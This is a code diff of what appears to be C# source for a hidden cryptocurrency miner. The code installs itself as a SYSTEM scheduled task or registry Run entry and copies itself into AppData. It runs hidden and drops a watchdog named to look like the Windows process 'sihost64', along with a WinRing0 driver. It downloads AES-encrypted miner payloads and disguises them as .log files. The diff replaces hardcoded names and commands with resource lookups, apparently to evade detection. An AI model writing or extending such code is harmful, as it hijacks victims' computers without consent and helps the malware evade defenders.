@@ -28,10 +28,9 @@ using System.Windows.Forms;
 
 public partial class Program
 {
-    public static string lb = RGetString("#LIBSPATH");
-    public static string bD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + lb;
+    public static string rbD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH");
 #if DefInstall
-    public static string plp = PayloadPath;
+    public static string rplp = PayloadPath;
 #endif
 
     public static void Main()
@@ -45,20 +44,20 @@ public partial class Program
                     Process.Start(new ProcessStartInfo
                     {
                         FileName = "cmd",
-                        Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(plp) + "\"" + " /tr " + "'" + "\"" + (plp) + "\"" + "' /RU \"SYSTEM\" & exit",
+                        Arguments = RGetString("#TASKSCH") + "\"" + Path.GetFileNameWithoutExtension(rplp) + "\"" + " /tr " + "'" + "\"" + (rplp) + "\"" + "' /RU \"SYSTEM\" & exit",
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true,
                         Verb = "runas"
                     });
                 }
                 catch(Exception ex){
-                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(plp), plp);
+                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(rplp), rplp);
 #if DefDebug
                 MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
 #endif
                 }
             }else{
-                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(plp), plp);
+                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(rplp), rplp);
             }
         }
         catch(Exception ex){
@@ -75,31 +74,31 @@ public partial class Program
     public static void RInstall()
     {
         Thread.Sleep(2 * 1000);
-        if (Process.GetCurrentProcess().MainModule.FileName != plp)
+        if (Process.GetCurrentProcess().MainModule.FileName != rplp)
         {
-            foreach (Process proc in Process.GetProcessesByName("sihost64"))
+            foreach (Process proc in Process.GetProcessesByName(RGetString("#WATCHDOG")))
             {
                 proc.Kill();
             }
 
             try
             {
-                File.Delete(Path.Combine(bD, "sihost64.log"));
+                File.Delete(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log"));
             } catch(Exception ex) {}
 
             try
             {
-                File.Delete(Path.Combine(bD, "sihost64-2.log"));
+                File.Delete(Path.Combine(rbD, RGetString("#WATCHDOG") + "-2.log"));
             } catch(Exception ex) {}
 
-            File.Copy(Process.GetCurrentProcess().MainModule.FileName, plp, true);
+            File.Copy(Process.GetCurrentProcess().MainModule.FileName, rplp, true);
             Thread.Sleep(5 * 1000);
             RBaseFolder();
-            Directory.CreateDirectory(Path.GetDirectoryName(plp));
+            Directory.CreateDirectory(Path.GetDirectoryName(rplp));
             Process.Start(new ProcessStartInfo
             {
-                FileName = plp,
-                WorkingDirectory = Path.GetDirectoryName(plp),  
+                FileName = rplp,
+                WorkingDirectory = Path.GetDirectoryName(rplp),  
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
             });
@@ -129,22 +128,22 @@ public partial class Program
     {
         try
         {
-            Directory.CreateDirectory(bD);
+            Directory.CreateDirectory(rbD);
 #if DefWatchdog
-            if (Process.GetProcessesByName("sihost64").Length < 1)
+            if (Process.GetProcessesByName(RGetString("#WATCHDOG")).Length < 1)
             {
-                File.WriteAllBytes(bD + "sihost64.exe", RGetTheResource("#watchdog"));
+                File.WriteAllBytes(rbD + RGetString("#WATCHDOG") + ".exe", RGetTheResource("#watchdog"));
 
                 Process.Start(new ProcessStartInfo
                 {
-                    FileName = Path.Combine(bD, "sihost64.exe"),
-                    WorkingDirectory = bD,
+                    FileName = Path.Combine(rbD, RGetString("#WATCHDOG") + ".exe"),
+                    WorkingDirectory = rbD,
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true,
                 });
             }
 #endif
-            File.WriteAllBytes(Path.Combine(bD, "WR64.sys"), RGetTheResource("#winring"));
+            File.WriteAllBytes(Path.Combine(rbD, "WR64.sys"), RGetTheResource("#winring"));
         }
         catch (Exception ex)
         {
@@ -203,19 +202,19 @@ public partial class Program
                     {
                         byte[] li = {};
 #if DefDownloader
-                        if (!File.Exists(Path.Combine(bD, "sihost64-2.log")))
+                        if (!File.Exists(Path.Combine(rbD, RGetString("#WATCHDOG") + "-2.log")))
                         {
                             using (var client = new System.Net.WebClient())
                             {
                                 li = client.DownloadData(RGetString("#LIBSURL"));
                             }
 #if DefInstall
-                            File.WriteAllBytes(Path.Combine(bD, "sihost64-2.log"), RAES_Method(li, true));
+                            File.WriteAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + "-2.log"), RAES_Method(li, true));
 #endif
                         }
                         else
                         {
-                            li = RAES_Method(File.ReadAllBytes(Path.Combine(bD, "sihost64-2.log")));
+                            li = RAES_Method(File.ReadAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + "-2.log")));
                         }
 #else
                         li = RGetTheResource("#libs");
@@ -224,13 +223,13 @@ public partial class Program
                         using (var archive = new ZipArchive(new MemoryStream(li)))
                         {
                             foreach (ZipArchiveEntry entry in archive.Entries){
-                                entry.ExtractToFile(Path.Combine(bD, entry.FullName), true);
+                                entry.ExtractToFile(Path.Combine(rbD, entry.FullName), true);
                             }
                         }
 
                         if (GPUstr.ToLower().Contains("nvidia"))
                         {
-                            rS += " --cuda --cuda-loader=" + "\"" + bD + "ddb64.dll" + "\"";
+                            rS += " --cuda --cuda-loader=" + "\"" + rbD + "ddb64.dll" + "\"";
                         }
 
                         if (GPUstr.ToLower().Contains("amd"))
@@ -260,30 +259,30 @@ public partial class Program
                 Environment.Exit(0);
             }
 
-            byte[] xm = { };
+            byte[] rxM = { };
 
 #if DefDownloader
-            if (!File.Exists(Path.Combine(bD, "sihost64.log")))
+            if (!File.Exists(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log")))
             {
                 using (var client = new System.Net.WebClient())
                 {
-                    xm = client.DownloadData(RGetString("#MINERURL"));
+                    rxM = client.DownloadData(RGetString("#MINERURL"));
                 }
 #if DefInstall
-                File.WriteAllBytes(Path.Combine(bD, "sihost64.log"), RAES_Method(xm, true));
+                File.WriteAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log"), RAES_Method(rxM, true));
 #endif
             }
             else
             {
-                xm = RAES_Method(File.ReadAllBytes(Path.Combine(bD, "sihost64.log")));
+                rxM = RAES_Method(File.ReadAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log")));
             }
 #else
-            xm = RGetTheResource("#xmr");
+            rxM = RGetTheResource("#xmr");
 #endif
 
             try
             {
-                using (var archive = new ZipArchive(new MemoryStream(xm)))
+                using (var archive = new ZipArchive(new MemoryStream(rxM)))
                 {
                     foreach (ZipArchiveEntry entry in archive.Entries)
                     {
